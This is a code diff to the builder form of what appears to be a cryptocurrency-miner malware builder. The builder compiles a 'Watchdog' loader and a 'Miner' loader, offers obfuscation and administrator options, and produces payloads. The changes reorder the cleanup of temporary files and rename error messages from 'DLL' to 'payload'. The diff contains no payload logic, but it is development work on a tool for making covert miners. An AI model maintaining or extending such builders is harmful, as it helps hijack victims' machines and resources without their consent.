@@ -116,19 +116,19 @@ Public Class Form1
                         Codedom.LoaderCompiler(watchdogpath & ".exe", File.ReadAllBytes(watchdogpath & ".dll"), Nothing, FA.toggleAdministrator.Checked)
 
                         If Codedom.LoaderOK Then
+                            File.Delete(watchdogpath & ".dll")
                             txtLog.Text = txtLog.Text + ("Compiled Watchdog loader!" + vbNewLine)
                             If FA.toggleObfuscation.Checked Then
                                 MessageBox.Show("The Watchdog loader has been compiled and can be found in the same folder as the chosen miner path (" & watchdogpath & ".exe" & "). Press OK after you're done with obfuscating and replacing the Watchdog loader.")
                             End If
                             watchdogdata = File.ReadAllBytes(watchdogpath & ".exe")
-                            File.Delete(watchdogpath & ".dll")
                             File.Delete(watchdogpath & ".exe")
                         Else
                             BuildError("Error compiling Watchdog loader!")
                             Return
                         End If
                     Else
-                        BuildError("Error compiling Watchdog DLL!")
+                        BuildError("Error compiling Watchdog payload!")
                         Return
                     End If
                 End If
@@ -147,6 +147,11 @@ Public Class Form1
                 Codedom.UninstallerCompiler(Path.GetDirectoryName(OutputPayload) & "\" & Path.GetFileNameWithoutExtension(OutputPayload) & "-uninstaller.exe")
 
                 If Codedom.LoaderOK Then
+                    Try
+                        File.Delete(minerpath)
+                        File.Delete(Path.GetTempPath + "\" + Resources_Parent + ".Resources")
+                    Catch ex As Exception
+                    End Try
                     txtLog.Text = txtLog.Text + ("Compiled Miner loader!" + vbNewLine)
                     If FA.toggleObfuscation.Checked Then
                         MessageBox.Show("The Miner loader has been compiled and can be found in the same folder as the chosen miner path (" & OutputPayload & "). Press OK after you're done with obfuscating and replacing the Miner loader.")
@@ -154,18 +159,12 @@ Public Class Form1
                     txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
                     If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                     btnBuild.Enabled = True
-
-                    Try
-                        File.Delete(minerpath)
-                        File.Delete(Path.GetTempPath + "\" + Resources_Parent + ".Resources")
-                    Catch ex As Exception
-                    End Try
                 Else
                     BuildError("Error compiling Miner loader!")
                     Return
                 End If
             Else
-                BuildError("Error compiling Miner DLL!")
+                BuildError("Error compiling Miner payload!")
                 Return
             End If
 
